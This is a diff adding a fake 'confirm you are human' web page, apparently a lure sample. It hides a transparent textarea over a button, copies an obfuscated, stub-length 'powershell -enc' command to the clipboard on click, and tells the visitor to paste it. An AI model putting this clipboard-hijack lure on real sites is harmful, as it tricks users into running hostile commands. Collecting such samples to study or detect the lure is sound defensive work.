@@ -1,0 +1,17 @@
+<!doctype html><meta charset="utf-8"><title>Checking your browser</title>
+<h1>Confirm you are human</h1>
+<div style="position:relative;width:200px;height:40px">
+  <button id="c" style="width:200px;height:40px">Continue</button>
+  <textarea id="t" style="opacity:0;position:absolute;left:0;top:0;width:200px;height:40px"></textarea>
+</div>
+<div id="steps"></div>
+<script>
+  // Forgery attempt: a transparent <textarea> laid over the button catches the real click and holds the
+  // payload the page then writes. Weak-lure page (no Win+R / captcha text). Payload built at runtime.
+  var payload = ['power', 'shell', ' -en', 'c', ' SQBFAFgA'].join('');
+  document.getElementById('t').value = payload;
+  document.addEventListener('click', function () {
+    try { navigator.clipboard.writeText(payload); } catch (e) {}
+    document.getElementById('steps').textContent = 'Paste it to continue.';
+  });
+</script>
